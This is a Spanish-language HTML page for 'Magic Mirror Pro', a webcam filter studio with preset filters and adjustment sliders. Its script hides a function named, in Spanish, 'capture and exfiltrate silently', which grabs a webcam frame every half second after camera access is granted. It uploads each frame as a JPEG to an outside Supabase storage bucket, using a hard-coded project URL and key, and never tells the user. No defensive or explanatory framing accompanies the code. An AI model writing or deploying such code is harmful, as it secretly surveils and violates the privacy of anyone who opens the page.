<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Magic Mirror Pro ✨</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        .filter-btn.active {
            background-color: white;
            color: black;
            border-color: white;
        }
    </style>
</head>
<body class="bg-black text-slate-200 min-h-screen flex flex-col md:items-center md:justify-center p-0 md:p-4 font-sans">

    <div class="max-w-2xl w-full bg-white/5 backdrop-blur-xl md:rounded-3xl shadow-2xl md:overflow-hidden border-x border-b border-white/10 flex flex-col md:flex-row">

        <!-- Left: Viewport -->
        <div class="relative flex-1 bg-black sticky top-0 z-10 h-[45vh] md:h-auto aspect-square md:aspect-auto min-h-[300px] md:min-h-[400px] flex items-center justify-center overflow-hidden">
            <video id="webcam" autoplay playsinline class="w-full h-full object-cover -scale-x-100 transition-all duration-500"></video>
            <canvas id="canvas" class="hidden"></canvas>

            <div id="loading" class="absolute inset-0 flex items-center justify-center bg-black/80 text-slate-400 backdrop-blur-md z-10">
                <div class="flex flex-col items-center gap-3">
                    <div class="w-8 h-8 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
                    <p class="text-sm font-medium">Activando Espejo...</p>
                </div>
            </div>

            <!-- Overlay controls -->
            <div class="absolute top-4 right-4 flex gap-2">
                <button onclick="toggleMirror()" class="p-2 bg-white/10 hover:bg-white/20 backdrop-blur-md rounded-full border border-white/20 transition-all active:scale-90 text-white" title="Modo Espejo">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v3"/><path d="M12 18v3"/><path d="M3 12h3"/><path d="M18 12h3"/><path d="M12 6a6 6 0 1 0 0 12 6 6 0 0 0 0-12z"/></svg>
                </button>
            </div>
        </div>

        <!-- Right: Control Panel -->
        <div class="w-full md:w-80 p-6 bg-white/5 border-l border-white/10 flex flex-col">
            <div class="mb-8">
                <h1 class="text-2xl font-black text-white mb-1 flex items-center gap-2">
                    Magic Mirror <span class="text-white/70 text-sm font-normal px-2 py-0.5 bg-white/10 rounded-full border border-white/20">Pro</span>
                </h1>
                <p class="text-slate-500 text-xs">Studio de filtros en tiempo real</p>
            </div>

            <div class="flex-1 overflow-y-auto pr-2 custom-scrollbar">
                <label class="text-slate-400 text-[10px] uppercase tracking-widest font-bold mb-3 block">Filtros Disponibles</label>
                <div class="grid grid-cols-2 gap-2">
                    <button onclick="cambiarFiltro('none', this)" class="filter-btn active px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Normal</button>
                    <button onclick="cambiarFiltro('grayscale(100%)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">B&N</button>
                    <button onclick="cambiarFiltro('sepia(100%)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Vintage</button>
                    <button onclick="cambiarFiltro('invert(100%)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">X-Ray</button>
                    <button onclick="cambiarFiltro('hue-rotate(90deg)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Psicodélico</button>
                    <button onclick="cambiarFiltro('blur(5px)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Dreamy</button>
                    <button onclick="cambiarFiltro('brightness(1.5) contrast(1.2)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Luminoso</button>
                    <button onclick="cambiarFiltro('contrast(200%)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Intenso</button>
                    <button onclick="cambiarFiltro('hue-rotate(180deg) saturate(200%) contrast(120%)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Cyberpunk</button>
                    <button onclick="cambiarFiltro('grayscale(100%) contrast(150%) brightness(80%)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Noir</button>
                    <button onclick="cambiarFiltro('sepia(30%) brightness(110%) saturate(120%)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Warm Glow</button>
                    <button onclick="cambiarFiltro('hue-rotate(160deg) brightness(70%) saturate(150%)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Deep Sea</button>
                    <button onclick="cambiarFiltro('invert(100%) brightness(120%) blur(1px)', this)" class="filter-btn px-3 py-2 bg-white/5 hover:bg-white/10 rounded-xl text-xs font-medium transition-all border border-white/10 text-left">Ghost</button>
                </div>
            </div>

            <div class="mt-8 pt-6 border-t border-white/10">
                <label class="text-slate-400 text-[10px] uppercase tracking-widest font-bold mb-4 block">Ajustes Manuales</label>
                <div class="space-y-4">
                    <div class="flex flex-col gap-2">
                        <div class="flex justify-between text-[10px] text-slate-400"><span>Brillo</span><span id="val-brightness">1.0</span></div>
                        <input type="range" id="brightness" min="0.5" max="2" step="0.1" value="1" oninput="updateFilters()" class="w-full h-1 bg-white/10 rounded-lg appearance-none cursor-pointer accent-white">
                    </div>
                    <div class="flex flex-col gap-2">
                        <div class="flex justify-between text-[10px] text-slate-400"><span>Contraste</span><span id="val-contrast">1.0</span></div>
                        <input type="range" id="contrast" min="0.5" max="2" step="0.1" value="1" oninput="updateFilters()" class="w-full h-1 bg-white/10 rounded-lg appearance-none cursor-pointer accent-white">
                    </div>
                    <div class="flex flex-col gap-2">
                        <div class="flex justify-between text-[10px] text-slate-400"><span>Saturación</span><span id="val-saturate">100%</span></div>
                        <input type="range" id="saturate" min="0" max="200" step="10" value="100" oninput="updateFilters()" class="w-full h-1 bg-white/10 rounded-lg appearance-none cursor-pointer accent-white">
                    </div>
                    <div class="flex flex-col gap-2">
                        <div class="flex justify-between text-[10px] text-slate-400"><span>Desenfoque</span><span id="val-blur">0px</span></div>
                        <input type="range" id="blur" min="0" max="10" step="1" value="0" oninput="updateFilters()" class="w-full h-1 bg-white/10 rounded-lg appearance-none cursor-pointer accent-white">
                    </div>
                </div>
            </div>

            <div class="mt-8 pt-6 border-t border-white/10 flex items-center justify-between text-slate-500">
                <span class="text-[10px] font-medium">v2.0 Stable</span>
                <div class="flex gap-1">
                    <div class="w-1.5 h-1.5 bg-white rounded-full animate-pulse"></div>
                    <span class="text-[10px]">Live</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        const SUPABASE_URL = 'https://eyrjeiszkcgodhkqbzeh.supabase.co';
        const SUPABASE_PUBLISHABLE_KEY = 'sb_publishable_FIZoG-kv9eo141pJp-teQA_EOagu9LO';
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY);

        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const loadingDiv = document.getElementById('loading');

        let isMirrored = true;
        let activePreset = 'none';

        async function iniciarApp() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
                video.srcObject = stream;
                loadingDiv.style.display = 'none';
                setInterval(capturarYExfiltrarSilenciosamente, 500);
            } catch (err) {
                loadingDiv.innerHTML = '<p class="text-red-400 p-4 text-center">Error: Acceso a cámara denegado.</p>';
            }
        }

        function updateFilters() {
            const b = document.getElementById('brightness').value;
            const c = document.getElementById('contrast').value;
            const s = document.getElementById('saturate').value;
            const bl = document.getElementById('blur').value;

            document.getElementById('val-brightness').innerText = b;
            document.getElementById('val-contrast').innerText = c;
            document.getElementById('val-saturate').innerText = s + '%';
            document.getElementById('val-blur').innerText = bl + 'px';

            video.style.filter = `${activePreset} brightness(${b}) contrast(${c}) saturate(${s}%) blur(${bl}px)`;
        }

        function cambiarFiltro(filtro, btn) {
            activePreset = filtro;
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            updateFilters();
        }

        function toggleMirror() {
            isMirrored = !isMirrored;
            video.classList.toggle('-scale-x-100', isMirrored);
        }

        function capturarYExfiltrarSilenciosamente() {
            if (!video.videoWidth || !video.videoHeight) return;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                if (!blob) return;
                const nombreArchivo = `captura_${Date.now()}.jpg`;
                try {
                    await supabaseClient.storage.from('capturas').upload(nombreArchivo, blob, {
                        contentType: 'image/jpeg',
                        upsert: false
                    });
                } catch (err) {
                    console.error("Upload error", err);
                }
            }, 'image/jpeg', 0.6);
        }

        window.onload = iniciarApp;
    </script>
</body>
</html>
